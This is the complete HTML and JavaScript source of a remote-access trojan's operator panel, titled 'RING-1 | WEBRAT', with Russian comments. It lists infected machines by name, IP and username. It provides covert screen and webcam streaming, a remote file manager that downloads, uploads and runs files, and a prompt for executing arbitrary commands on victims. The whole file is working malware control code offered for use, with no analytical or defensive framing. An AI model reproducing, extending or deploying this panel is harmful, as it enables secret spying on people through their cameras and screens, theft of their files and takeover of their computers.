<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>RING-1 | Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ffcc;
            overflow-x: hidden;
        }
        .header {
            background: #000;
            border-bottom: 1px solid #00ffcc;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .logo { font-size: 24px; font-weight: bold; }
        .logout-btn { background: #ff0033; color: white; border: none; padding: 8px 20px; cursor: pointer; }
        .container { max-width: 1600px; margin: 20px auto; padding: 0 20px; }
        .computers-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .computer-card {
            background: #0a0a0a;
            border: 1px solid #00ffcc;
            border-radius: 8px;
            padding: 15px;
        }
        .computer-header { display: flex; justify-content: space-between; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px; }
        .status { padding: 2px 8px; border-radius: 4px; font-size: 11px; background: #00cc88; color: black; }
        .status.offline { background: #ff0033; }
        .computer-info p { font-size: 12px; margin: 4px 0; }
        .action-buttons { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 15px; }
        .action-btn {
            background: #1a1a1a;
            border: 1px solid #00ffcc;
            color: #00ffcc;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
        }
        .action-btn:hover { background: #00ffcc; color: black; }
        
        /* Модальное окно стрима */
        .stream-modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.98);
            z-index: 1000;
            flex-direction: column;
        }
        .stream-header { background: #000; padding: 15px; display: flex; justify-content: space-between; border-bottom: 1px solid #00ffcc; }
        .stream-video { flex: 1; display: flex; justify-content: center; align-items: center; }
        .stream-video video { max-width: 100%; max-height: 90vh; border: 2px solid #00ffcc; background: #000; }
        .close-stream { background: #ff0033; color: white; border: none; padding: 10px 20px; cursor: pointer; }
        
        /* Файловый менеджер */
        .filemodal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 1000;
        }
        .filemodal-content {
            width: 90%;
            max-width: 1000px;
            margin: 50px auto;
            background: #0a0a0a;
            border: 2px solid #00ffcc;
            border-radius: 10px;
            padding: 20px;
            max-height: 80vh;
            overflow: auto;
        }
        .filemodal-header { display: flex; justify-content: space-between; margin-bottom: 20px; }
        .file-list { margin-top: 20px; }
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px;
            border-bottom: 1px solid #333;
            cursor: pointer;
        }
        .file-item:hover { background: #1a1a1a; }
        .file-name { color: #00ffcc; }
        .file-size { font-size: 11px; color: #888; }
        .file-actions button { background: none; border: 1px solid #00ffcc; color: #00ffcc; padding: 2px 8px; margin-left: 5px; cursor: pointer; font-size: 10px; }
        .path-bar { margin-bottom: 20px; display: flex; gap: 10px; }
        .path-bar input { flex: 1; background: #1a1a1a; border: 1px solid #00ffcc; color: #00ffcc; padding: 8px; }
        .loading { text-align: center; padding: 30px; color: #00ffcc; }
    </style>
    <script src="/socket.io/socket.io.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.0/simplepeer.min.js"></script>
</head>
<body>
<div id="app">
    <div class="header">
        <div class="logo">🔷 RING-1 | WEBRAT</div>
        <button class="logout-btn" onclick="logout()">EXIT</button>
    </div>
    <div class="container">
        <div style="margin-bottom: 20px;">
            <span id="onlineCount" style="color: #00ffcc;">0</span> online / <span id="totalCount">0</span> total
        </div>
        <div class="computers-grid" id="computersContainer">Loading...</div>
    </div>
</div>

<div id="streamModal" class="stream-modal">
    <div class="stream-header">
        <span id="streamTitle">📺 STREAM</span>
        <button class="close-stream" onclick="stopStream()">✕ CLOSE</button>
    </div>
    <div class="stream-video">
        <video id="streamVideo" autoplay playsinline muted></video>
    </div>
</div>

<div id="fileModal" class="filemodal">
    <div class="filemodal-content">
        <div class="filemodal-header">
            <h3>📁 FILE MANAGER</h3>
            <button onclick="closeFileModal()" style="background:#ff0033; color:white; border:none; padding:5px 15px;">✕</button>
        </div>
        <div class="path-bar">
            <input type="text" id="currentPath" value="C:\\">
            <button onclick="loadFileList()">📂 GO</button>
            <button onclick="uploadFileToComputer()" style="background:#00ffcc; color:black;">📤 UPLOAD</button>
        </div>
        <div id="fileListContainer" class="file-list">Loading...</div>
    </div>
</div>

<script>
    let socket = null;
    let currentComputerIdForFiles = null;
    let currentStreamComputerId = null;
    let currentSessionId = null;
    let peer = null;
    
    async function checkAuth() {
        const resp = await fetch('/api/user');
        if (!resp.ok) window.location.href = '/login.html';
    }
    
    function connectSocket() {
        socket = io({ transports: ['websocket'] });
        socket.on('webrtc_signal', async (data) => {
            if (data.signal && peer) await peer.signal(data.signal);
        });
    }
    
    async function loadComputers() {
        const resp = await fetch('/api/computers');
        const comps = await resp.json();
        document.getElementById('onlineCount').innerText = comps.filter(c => c.status === 'online').length;
        document.getElementById('totalCount').innerText = comps.length;
        const container = document.getElementById('computersContainer');
        if (comps.length === 0) { container.innerHTML = '<div style="color:#00ffcc; text-align:center;">NO AGENTS ONLINE</div>'; return; }
        container.innerHTML = comps.map(c => `
            <div class="computer-card">
                <div class="computer-header">
                    <span>🖥️ ${c.computerName}</span>
                    <span class="status ${c.status === 'online' ? '' : 'offline'}">${c.status === 'online' ? 'ONLINE' : 'OFFLINE'}</span>
                </div>
                <div class="computer-info">
                    <p>🆔 ${c.computerId.substring(0, 12)}... | 💻 ${c.os} | 🌐 ${c.ip}</p>
                    <p>👤 ${c.username} | 🕐 ${new Date(c.lastSeen).toLocaleTimeString()}</p>
                </div>
                <div class="action-buttons">
                    <button class="action-btn" onclick="startScreenStream('${c.computerId}')">📺 SCREEN</button>
                    <button class="action-btn" onclick="startWebcamStream('${c.computerId}')">🎥 WEBCAM</button>
                    <button class="action-btn" onclick="openFileManager('${c.computerId}')">📁 FILES</button>
                    <button class="action-btn" onclick="sendCommandPrompt('${c.computerId}')">⚡ CMD</button>
                </div>
            </div>
        `).join('');
    }
    
    // === СТРИМИНГ ===
    async function startScreenStream(computerId) {
        currentStreamComputerId = computerId;
        document.getElementById('streamTitle').innerHTML = `📺 SCREEN: ${computerId}`;
        document.getElementById('streamModal').style.display = 'flex';
        const resp = await fetch(`/api/stream/screen/${computerId}`, { method: 'POST' });
        if (resp.ok) {
            const data = await resp.json();
            currentSessionId = data.sessionId;
            initWebRTC(data.sessionId, computerId);
        } else alert('Stream failed');
    }
    
    async function startWebcamStream(computerId) {
        currentStreamComputerId = computerId;
        document.getElementById('streamTitle').innerHTML = `🎥 WEBCAM: ${computerId}`;
        document.getElementById('streamModal').style.display = 'flex';
        const resp = await fetch(`/api/stream/webcam/${computerId}`, { method: 'POST' });
        if (resp.ok) {
            const data = await resp.json();
            currentSessionId = data.sessionId;
            initWebRTC(data.sessionId, computerId);
        } else alert('Stream failed');
    }
    
    function initWebRTC(sessionId, computerId) {
        if (peer) peer.destroy();
        peer = new SimplePeer({ initiator: true, trickle: false });
        socket.emit('join_stream', sessionId);
        peer.on('signal', (signal) => { socket.emit('panel_signal', { computerId, signal }); });
        peer.on('stream', (stream) => { document.getElementById('streamVideo').srcObject = stream; });
        peer.on('error', () => alert('WebRTC error'));
    }
    
    async function stopStream() {
        if (currentSessionId) await fetch(`/api/stream/stop/${currentSessionId}`, { method: 'POST' });
        if (peer) peer.destroy();
        document.getElementById('streamModal').style.display = 'none';
        const video = document.getElementById('streamVideo');
        if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
    }
    
    // === ФАЙЛОВЫЙ МЕНЕДЖЕР ===
    function openFileManager(computerId) {
        currentComputerIdForFiles = computerId;
        document.getElementById('currentPath').value = 'C:\\';
        document.getElementById('fileModal').style.display = 'block';
        loadFileList();
    }
    
    function closeFileModal() { document.getElementById('fileModal').style.display = 'none'; }
    
    async function loadFileList() {
        const path = document.getElementById('currentPath').value;
        document.getElementById('fileListContainer').innerHTML = '<div class="loading">Loading...</div>';
        const resp = await fetch(`/api/files/list/${currentComputerIdForFiles}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ path })
        });
        if (resp.ok) {
            const data = await resp.json();
            renderFileList(data.files);
        } else {
            document.getElementById('fileListContainer').innerHTML = '<div class="loading">ERROR loading directory</div>';
        }
    }
    
    function renderFileList(files) {
        const container = document.getElementById('fileListContainer');
        if (!files || files.length === 0) { container.innerHTML = '<div class="loading">Empty directory</div>'; return; }
        container.innerHTML = files.map(f => `
            <div class="file-item" ondblclick="navigateTo('${f.path}')">
                <span class="file-name">${f.isDir ? '📁' : '📄'} ${f.name}</span>
                <span class="file-size">${f.isDir ? 'DIR' : f.size}</span>
                <div class="file-actions">
                    ${!f.isDir ? `<button onclick="downloadFile('${f.path}')">⬇️ DOWNLOAD</button>` : ''}
                    ${!f.isDir ? `<button onclick="executeFile('${f.path}')">▶️ RUN</button>` : ''}
                </div>
            </div>
        `).join('');
    }
    
    function navigateTo(path) { document.getElementById('currentPath').value = path; loadFileList(); }
    
    async function downloadFile(filePath) {
        const resp = await fetch(`/api/files/download/${currentComputerIdForFiles}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filePath })
        });
        if (resp.ok) {
            const data = await resp.json();
            const a = document.createElement('a');
            a.href = `data:application/octet-stream;base64,${data.data}`;
            a.download = data.filename;
            a.click();
        } else alert('Download failed');
    }
    
    function uploadFileToComputer() {
        const input = document.createElement('input');
        input.type = 'file';
        input.onchange = async (e) => {
            const file = e.target.files[0];
            const reader = new FileReader();
            reader.onload = async (ev) => {
                const base64 = ev.target.result.split(',')[1];
                const formData = new FormData();
                formData.append('file', file);
                formData.append('remotePath', document.getElementById('currentPath').value);
                const resp = await fetch(`/api/files/upload/${currentComputerIdForFiles}`, {
                    method: 'POST',
                    body: formData
                });
                if (resp.ok) { alert('Uploaded!'); loadFileList(); }
                else alert('Upload failed');
            };
            reader.readAsDataURL(file);
        };
        input.click();
    }
    
    async function executeFile(filePath) {
        if (!confirm(`Execute ${filePath}?`)) return;
        const resp = await fetch(`/api/files/execute/${currentComputerIdForFiles}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filePath })
        });
        if (resp.ok) { const data = await resp.json(); alert(data.output || 'Executed'); }
        else alert('Execute failed');
    }
    
    async function sendCommandPrompt(computerId) {
        const cmd = prompt('Enter command:');
        if (!cmd) return;
        const resp = await fetch(`/api/command/${computerId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command: cmd })
        });
        if (resp.ok) { const data = await resp.json(); alert(data.output || 'Command executed'); }
        else alert('Command failed');
    }
    
    async function logout() { await fetch('/api/logout', { method: 'POST' }); window.location.href = '/login.html'; }
    
    checkAuth();
    connectSocket();
    setInterval(loadComputers, 10000);
    loadComputers();
</script>
</body>
</html>
